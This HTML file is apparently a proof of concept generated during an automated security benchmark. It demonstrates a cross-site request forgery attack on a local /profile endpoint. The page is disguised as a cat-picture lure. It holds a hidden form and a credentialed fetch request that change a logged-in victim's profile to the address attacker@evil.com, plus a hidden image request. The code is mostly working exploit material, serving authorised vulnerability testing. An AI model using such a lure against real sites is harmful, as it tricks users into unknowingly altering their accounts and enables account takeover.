<!-- 
POC: HTML-based POC demonstrating CSRF attack on /profile endpoint with hidden form and fetch API examples
Target: ./repo
Created: 2025-11-10T14:44:26.651Z
Session: benchmark-XBEN-024-24-mht8yjhk

To test this POC:
1. Open this file in a web browser: file:///home/daytona/.pensar/executions/benchmark-XBEN-024-24-mht8yjhk/pocs/poc_csrf_profile_update_html.html
2. Or serve it and navigate to the target application
3. Observe the vulnerability demonstration (e.g., XSS alert, CSRF execution)
-->

<!DOCTYPE html>
<html>
<head>
    <title>Totally Legitimate Cat Picture</title>
</head>
<body>
    <h1>Check out this cool cat!</h1>
    <p>Click below to see an amazing cat picture...</p>
    
    <!-- Hidden CSRF attack form that will auto-submit -->
    <form id="csrf-form" method="POST" action="http://localhost:3000/profile" style="display:none;">
        <input type="hidden" name="first_name" value="CSRFED">
        <input type="hidden" name="last_name" value="HACKED">
        <input type="hidden" name="email" value="attacker@evil.com">
        <input type="submit" value="See Cat">
    </form>
    
    <!-- Alternative attack vector using fetch API -->
    <script>
        // This script demonstrates the CSRF vulnerability
        // In a real attack, this would be hidden or triggered automatically
        
        function performCSRFAttack() {
            // The /profile endpoint doesn't validate CSRF tokens
            // This request can be made from any domain
            fetch('http://localhost:3000/profile', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded',
                },
                credentials: 'include', // Include cookies to maintain session
                body: 'first_name=CSRFED&last_name=HACKED&email=attacker@evil.com'
            })
            .then(response => {
                console.log('[+] CSRF Attack Sent');
                console.log('[+] Status: ' + response.status);
                return response.text();
            })
            .then(data => {
                console.log('[+] Response received');
                console.log('[!] User profile has been modified without their consent!');
            })
            .catch(error => {
                console.log('[-] Error: ' + error);
            });
        }
        
        // Uncomment the line below to auto-execute the attack when page loads
        // performCSRFAttack();
        
        // Document the vulnerability
        console.log('=== CSRF Vulnerability Proof of Concept ===');
        console.log('[*] Endpoint: /profile');
        console.log('[*] Vulnerability: No CSRF token validation');
        console.log('[*] Attack Vector: POST request without token');
        console.log('[*] Impact: Attacker can modify user profile information');
        console.log('[*] To execute: Call performCSRFAttack() in browser console');
    </script>
    
    <!-- Alternative: Use image/iframe to trigger the attack -->
    <img src="http://localhost:3000/profile?first_name=CSRFED&last_name=HACKED" style="display:none;">
    
    <p>The form above demonstrates a CSRF attack. When an authenticated user visits this page,
    their browser will automatically send a POST request to their profile endpoint on localhost:3000,
    modifying their profile information.</p>
    
    <details>
        <summary>Technical Details</summary>
        <p>
        This POC demonstrates that the /profile endpoint:<br>
        1. Does not validate CSRF tokens on POST requests<br>
        2. Does not check the Origin or Referer headers<br>
        3. Accepts profile updates from any source<br>
        4. Does not use SameSite cookie attribute<br>
        <br>
        An attacker can exploit this by:<br>
        - Creating a malicious webpage<br>
        - Tricking an authenticated user into visiting it<br>
        - The user's browser automatically sends authenticated requests<br>
        - User's profile is modified without their knowledge<br>
        </p>
    </details>
</body>
</html>